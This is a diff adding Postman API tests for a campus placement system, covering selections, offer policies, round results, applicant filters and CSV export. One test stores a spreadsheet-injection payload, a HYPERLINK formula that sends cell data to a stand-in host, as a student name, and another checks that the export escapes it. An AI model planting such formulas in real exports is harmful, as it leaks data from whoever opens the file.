+              "mode": "raw",
+              "raw": "{\n  \"applicationIds\": [ {{lcApp1A}} ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 SELECTED, and the drive-B application listed as made INELIGIBLE', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.selected.map(s => s.status)).to.eql(['SELECTED']);",
+                  "  pm.expect(b.madeIneligible).to.have.length(1);",
+                  "  pm.expect(b.madeIneligible[0].applicationId).to.eql(Number(pm.collectionVariables.get('lcApp1B')));",
+                  "  pm.expect(b.madeIneligible[0].reason).to.include('One-offer policy: you already hold an offer of 12.00 LPA');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 1: drive B application is now INELIGIBLE with the reason (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/students/me/applications/{{lcApp1B}}",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{lcToken1}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('INELIGIBLE with the policy reason', () => {",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.status).to.eql('INELIGIBLE');",
+                  "  pm.expect(b.statusReason).to.include('One-offer policy');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: close drive B (200)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveB}}/close"
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 CLOSED', () => pm.expect(pm.response.json().status).to.eql('CLOSED'));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: select the INELIGIBLE drive-B application (409 with the reason)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveB}}/selections",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"applicationIds\": [ {{lcApp1B}} ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('409 INELIGIBLE, with the policy reason', () => {",
+                  "  pm.response.to.have.status(409);",
+                  "  pm.expect(pm.response.json().details[0]).to.include('is INELIGIBLE and can\\'t be selected: One-offer policy');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: complete drive A (200)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/complete"
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 COMPLETED', () => pm.expect(pm.response.json().status).to.eql('COMPLETED'));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 3: still-pending application was REJECTED on completion, with rounds (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/students/me/applications/{{lcApp3A}}",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{lcToken3}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('REJECTED: Drive completed without selection; Round 1 CLEARED, Round 2 no result', () => {",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.status).to.eql('REJECTED');",
+                  "  pm.expect(b.statusReason).to.eql('Drive completed without selection');",
+                  "  pm.expect(b.rounds).to.eql([",
+                  "    { roundNo: 1, name: 'Aptitude', scheduledAt: b.rounds[0].scheduledAt, result: 'CLEARED', remarks: 'Re-checked' },",
+                  "    { roundNo: 2, name: 'Technical', scheduledAt: null, result: null, remarks: null }",
+                  "  ]);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 1: SELECTED, with round-by-round results (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/students/me/applications/{{lcApp1A}}",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{lcToken1}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('SELECTED; both rounds CLEARED', () => {",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.status).to.eql('SELECTED');",
+                  "  pm.expect(b.rounds.map(r => r.result)).to.eql(['CLEARED', 'CLEARED']);",
+                  "  pm.expect(b.rounds[0].remarks).to.eql('Top scorer');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 2: REJECTED in Round 2 stays REJECTED with its own reason (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/students/me/applications/{{lcApp2A}}",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{lcToken2}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('REJECTED, Round 2 reason and remarks', () => {",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.statusReason).to.eql('Not cleared in Round 2: Technical');",
+                  "  pm.expect(b.rounds[1].remarks).to.eql('Weak on DSA');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: results after COMPLETED (409)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds/{{lcRound1}}/results",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"results\": [ { \"applicationId\": {{lcApp3A}}, \"result\": \"CLEARED\" } ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('409 COMPLETED is final', () => {",
+                  "  pm.response.to.have.status(409);",
+                  "  pm.expect(pm.response.json().message).to.include('(status: COMPLETED)');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Student: rounds are admin-only (403)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{lcToken1}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('403', () => pm.response.to.have.status(403));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Cleanup: complete drive B (200)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveB}}/complete"
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 COMPLETED', () => pm.expect(pm.response.json().status).to.eql('COMPLETED'));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Restore: deactivate ONE_OFFER (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/policies/ONE_OFFER",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"active\": false\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200', () => pm.response.to.have.status(200));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Restore: DREAM_OFFER active at 10 (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/policies/DREAM_OFFER",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"active\": true,\n  \"ctcThresholdLpa\": 10\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200', () => pm.response.to.have.status(200));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Check: policies back to the seed state (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/policies"
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('only DREAM_OFFER (10) active', () => {",
+                  "  const list = pm.response.json();",
+                  "  pm.expect(list.filter(p => p.active).map(p => p.type)).to.eql(['DREAM_OFFER']);",
+                  "  pm.expect(list.find(p => p.type === 'DREAM_OFFER').ctcThresholdLpa).to.eql(10);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Admin views (M7B)",
+      "item": [
+        {
+          "name": "Setup: register student 1 (AdminViews Asha, CSE, CGPA 8.5) and log in (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/auth/register",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{avEmail1}}\",\n  \"password\": \"AdminViews@123\",\n  \"fullName\": \"AdminViews Asha\",\n  \"rollNo\": \"{{avRoll1}}\",\n  \"branch\": \"CSE\",\n  \"graduationYear\": 2027,\n  \"cgpa\": 8.5,\n  \"activeBacklogs\": 0\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// One id per run: fresh students and company, so the folder can be re-run any number of times",
+                  "pm.collectionVariables.set('avRun', Date.now().toString());",
+                  "pm.collectionVariables.set('avSince', new Date(Date.now() - 1000).toISOString());",
+                  "// One fixed deadline for the whole folder (the collection's futureDeadline changes on every request)",
+                  "pm.collectionVariables.set('avDeadline', new Date(Date.now() + 20 * 24 * 60 * 60 * 1000).toISOString());",
+                  "const run = pm.collectionVariables.get('avRun');",
+                  "pm.collectionVariables.set('avEmail1', `av.${run}.s1@student.placementhub.dev`);",
+                  "pm.collectionVariables.set('avRoll1', `AV${run}S1`);"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 student registered', () => pm.response.to.have.status(201));",
+                  "pm.sendRequest({",
+                  "  url: pm.variables.get('baseUrl') + '/api/auth/login',",
+                  "  method: 'POST',",
+                  "  header: { 'Content-Type': 'application/json' },",
+                  "  body: { mode: 'raw', raw: JSON.stringify({ email: pm.collectionVariables.get('avEmail1'), password: 'AdminViews@123' }) }",
+                  "}, (err, res) => {",
+                  "  pm.test('student 1 logged in', () => pm.expect(res.code).to.eql(200));",
+                  "  pm.collectionVariables.set('avToken1', res.json().accessToken);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Setup: register student 2 (AdminViews Imran, IT, CGPA 7.2) and log in (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/auth/register",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{avEmail2}}\",\n  \"password\": \"AdminViews@123\",\n  \"fullName\": \"AdminViews Imran\",\n  \"rollNo\": \"{{avRoll2}}\",\n  \"branch\": \"IT\",\n  \"graduationYear\": 2027,\n  \"cgpa\": 7.2,\n  \"activeBacklogs\": 0\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const run = pm.collectionVariables.get('avRun');",
+                  "pm.collectionVariables.set('avEmail2', `av.${run}.s2@student.placementhub.dev`);",
+                  "pm.collectionVariables.set('avRoll2', `AV${run}S2`);"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 student registered', () => pm.response.to.have.status(201));",
+                  "pm.sendRequest({",
+                  "  url: pm.variables.get('baseUrl') + '/api/auth/login',",
+                  "  method: 'POST',",
+                  "  header: { 'Content-Type': 'application/json' },",
+                  "  body: { mode: 'raw', raw: JSON.stringify({ email: pm.collectionVariables.get('avEmail2'), password: 'AdminViews@123' }) }",
+                  "}, (err, res) => {",
+                  "  pm.test('student 2 logged in', () => pm.expect(res.code).to.eql(200));",
+                  "  pm.collectionVariables.set('avToken2', res.json().accessToken);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Setup: register student 3 (AdminViews Formula, CSE, CGPA 6.8) and log in (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/auth/register",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{avEmail3}}\",\n  \"password\": \"AdminViews@123\",\n  \"fullName\": \"AdminViews Formula\",\n  \"rollNo\": \"{{avRoll3}}\",\n  \"branch\": \"CSE\",\n  \"graduationYear\": 2027,\n  \"cgpa\": 6.8,\n  \"activeBacklogs\": 0\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const run = pm.collectionVariables.get('avRun');",
+                  "pm.collectionVariables.set('avEmail3', `av.${run}.s3@student.placementhub.dev`);",
+                  "pm.collectionVariables.set('avRoll3', `AV${run}S3`);"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 student registered', () => pm.response.to.have.status(201));",
+                  "pm.sendRequest({",
+                  "  url: pm.variables.get('baseUrl') + '/api/auth/login',",
+                  "  method: 'POST',",
+                  "  header: { 'Content-Type': 'application/json' },",
+                  "  body: { mode: 'raw', raw: JSON.stringify({ email: pm.collectionVariables.get('avEmail3'), password: 'AdminViews@123' }) }",
+                  "}, (err, res) => {",
+                  "  pm.test('student 3 logged in', () => pm.expect(res.code).to.eql(200));",
+                  "  pm.collectionVariables.set('avToken3', res.json().accessToken);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 3: set a formula as the name, phone with + (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/students/me",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"fullName\": \"=HYPERLINK(\\\"http://evil.example/?d=\\\"&A2,\\\"Click\\\")\",\n  \"phone\": \"+919876543210\"\n}"
+            },
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{avToken3}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200, the name is stored as typed', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  pm.expect(pm.response.json().fullName).to.eql('=HYPERLINK(\"http://evil.example/?d=\"&A2,\"Click\")');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: create company (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/companies",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"name\": \"AdminViews Co {{avRun}}\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201', () => pm.response.to.have.status(201));",
+                  "pm.collectionVariables.set('avCompanyId', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: create drive, CSE + IT, CGPA 6.5 (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"companyId\": {{avCompanyId}},\n  \"roleTitle\": \"Data Engineer\",\n  \"jobType\": \"FULL_TIME\",\n  \"ctcLpa\": 10,\n  \"location\": \"Hyderabad\",\n  \"description\": \"Postman admin-views drive\",\n  \"minCgpa\": 6.5,\n  \"maxBacklogs\": 0,\n  \"graduationYear\": 2027,\n  \"registrationDeadline\": \"{{avDeadline}}\",\n  \"branches\": [\n    \"CSE\",\n    \"IT\"\n  ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 DRAFT', () => pm.response.to.have.status(201));",
+                  "pm.collectionVariables.set('avDrive', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: open the drive (200)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/open",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 OPEN', () => pm.expect(pm.response.json().status).to.eql('OPEN'));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 1: apply (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/students/me/applications",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"driveId\": {{avDrive}}\n}"
+            },
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{avToken1}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 APPLIED', () => {",
+                  "  pm.response.to.have.status(201);",
+                  "  pm.expect(pm.response.json().status).to.eql('APPLIED');",
+                  "});",
+                  "pm.collectionVariables.set('avApp1', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 2: apply (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/students/me/applications",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"driveId\": {{avDrive}}\n}"
+            },
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{avToken2}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 APPLIED', () => {",
+                  "  pm.response.to.have.status(201);",
+                  "  pm.expect(pm.response.json().status).to.eql('APPLIED');",
+                  "});",
+                  "pm.collectionVariables.set('avApp2', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 3: apply (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/students/me/applications",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"driveId\": {{avDrive}}\n}"
+            },
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{avToken3}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 APPLIED', () => {",
+                  "  pm.response.to.have.status(201);",
+                  "  pm.expect(pm.response.json().status).to.eql('APPLIED');",
+                  "});",
+                  "pm.collectionVariables.set('avApp3', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: applicants list with student details and progress (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/applications",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200, 3 applicants sorted by roll number, with details and empty progress', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.totalElements).to.eql(3);",
+                  "  const rolls = b.content.map(r => r.rollNo);",
+                  "  pm.expect(rolls).to.eql([...rolls].sort());",
+                  "  const asha = b.content.find(r => r.applicationId === Number(pm.collectionVariables.get('avApp1')));",
+                  "  pm.expect(asha.fullName).to.eql('AdminViews Asha');",
+                  "  pm.expect(asha.email).to.eql(pm.collectionVariables.get('avEmail1'));",
+                  "  pm.expect(asha.branch).to.eql('CSE');",
+                  "  pm.expect(asha.cgpa).to.eql(8.5);",
+                  "  pm.expect(asha.status).to.eql('APPLIED');",
+                  "  pm.expect(asha.progress).to.eql({ totalRounds: 0, latestRound: null });",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: applicants filtered by branch=CSE (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/applications?branch=CSE",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200, only the two CSE students', () => {",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.totalElements).to.eql(2);",
+                  "  pm.expect(b.content.every(r => r.branch === 'CSE')).to.be.true;",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: applicants filtered by minCgpa=7.2, inclusive (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/applications?minCgpa=7.2",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200, CGPA 8.5 and exactly 7.2', () => {",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.content.map(r => r.cgpa).sort()).to.eql([7.2, 8.5]);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: applicants filtered by status, one per page (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/applications?status=APPLIED&size=1&page=1",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200, page 2 of 3', () => {",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.content).to.have.length(1);",
+                  "  pm.expect(b.page).to.eql(1);",
+                  "  pm.expect(b.totalElements).to.eql(3);",
+                  "  pm.expect(b.totalPages).to.eql(3);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: applicants with minCgpa=11 (400)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/applications?minCgpa=11",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('400 minCgpa range', () => {",
+                  "  pm.response.to.have.status(400);",
+                  "  pm.expect(pm.response.json().message).to.eql('minCgpa must be between 0 and 10');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: applicants with an unknown status (400)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/applications?status=HIRED",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('400', () => pm.response.to.have.status(400));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: applicants of a missing drive (404)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/999999/applications",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('404', () => pm.response.to.have.status(404));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Student: applicants list is admin-only (403)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/applications",
+            "header": [],
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{avToken1}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('403', () => pm.response.to.have.status(403));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: export applicants as CSV, formula escaped (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}/applications/export",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 CSV attachment', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  pm.expect(pm.response.headers.get('Content-Type')).to.include('text/csv');",
+                  "  pm.expect(pm.response.headers.get('Content-Disposition'))",
+                  "    .to.eql(`attachment; filename=\"drive-${pm.collectionVariables.get('avDrive')}-applicants.csv\"`);",
+                  "});",
+                  "const lines = pm.response.text().replace(/^\\uFEFF/, '').split('\\r\\n').filter(l => l.length);",
+                  "pm.test('header + 3 rows', () => {",
+                  "  pm.expect(lines[0]).to.match(/^Application ID,Roll No,Name,Email,/);",
+                  "  pm.expect(lines).to.have.length(4);",
+                  "});",
+                  "pm.test('the formula name is text: leading apostrophe inside quotes, quotes doubled', () => {",
+                  "  const row = lines.find(l => l.includes('HYPERLINK'));",
+                  "  pm.expect(row).to.include('\"\\'=HYPERLINK(\"\"http://evil.example/?d=\"\"&A2,\"\"Click\"\")\"');",
+                  "  pm.expect(row).to.include(\",'+919876543210,\");",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: export for a missing drive is a JSON 404",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/999999/applications/export",
+            "header": []
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('404 JSON', () => { pm.response.to.have.status(404); pm.response.to.be.json; });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: change jobType of an OPEN drive (409)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"roleTitle\": \"Data Engineer\",\n  \"jobType\": \"INTERNSHIP\",\n  \"ctcLpa\": 10,\n  \"location\": \"Hyderabad\",\n  \"description\": \"Postman admin-views drive\",\n  \"minCgpa\": 6.5,\n  \"maxBacklogs\": 0,\n  \"graduationYear\": 2027,\n  \"registrationDeadline\": \"{{avDeadline}}\",\n  \"branches\": [\n    \"CSE\",\n    \"IT\"\n  ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('409 jobType only while DRAFT', () => {",
+                  "  pm.response.to.have.status(409);",
+                  "  pm.expect(pm.response.json().message).to.include('jobType can be changed only while the drive is DRAFT');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: tighten criteria to CSE only, CGPA 7.0, two applications made INELIGIBLE (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{avDrive}}",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"roleTitle\": \"Data Engineer\",\n  \"jobType\": \"FULL_TIME\",\n  \"ctcLpa\": 10,\n  \"location\": \"Hyderabad\",\n  \"description\": \"Postman admin-views drive\",\n  \"minCgpa\": 7.0,\n  \"maxBacklogs\": 0,\n  \"graduationYear\": 2027,\n  \"registrationDeadline\": \"{{avDeadline}}\",\n  \"branches\": [\n    \"CSE\"\n  ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 with applicationsMadeIneligible = 2', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  pm.expect(pm.response.json().applicationsMadeIneligible).to.eql(2);",
+                  "  pm.expect(pm.response.json().branches).to.eql(['CSE']);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 2: application is INELIGIBLE with the criteria reason (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/students/me/applications/{{avApp2}}",
+            "header": [],
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{avToken2}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 INELIGIBLE, reason names the change', () => {",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.status).to.eql('INELIGIBLE');",
+                  "  pm.expect(b.statusReason).to.eql('Drive criteria changed: Open only to CSE; your branch is IT');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
